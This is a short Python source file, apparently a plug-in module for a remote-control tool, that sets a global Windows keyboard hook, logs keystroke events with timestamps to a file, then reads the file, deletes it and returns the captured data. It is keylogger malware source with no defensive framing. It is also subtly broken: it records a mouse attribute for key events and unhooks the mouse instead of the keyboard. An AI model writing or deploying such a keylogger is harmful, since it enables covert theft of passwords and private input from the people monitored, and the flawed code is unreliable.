import pythoncom,pyHook
from datetime import datetime
import os
import threading
def run(**args):
    fo = open("outputKey.txt", "w")
    fo.close()
    t = threading.Thread(target=keys,)
    t.start()
    while (os.stat("outputKey.txt").st_size == 0):
        pass
    fi = open("outputKey.txt", "r+")
    data = fi.read()
    fi.close()
    os.remove("outputKey.txt")
    return data
def keys(**args):
    key_list = []
    def onkey(event):
        if(len(key_list) == 10):
            hm.UnhookMouse()
            fo = open("outputKey.txt", "w")
            fo.write(str(key_list))
            fo.close()
        key_timer = str(datetime.now())
        x = (event.Position,key_timer)
        key_list.append(x)
        return True
    hm = pyHook.HookManager()
    hm.KeyDown=onkey
    hm.HookKeyboard()
    pythoncom.PumpMessages()
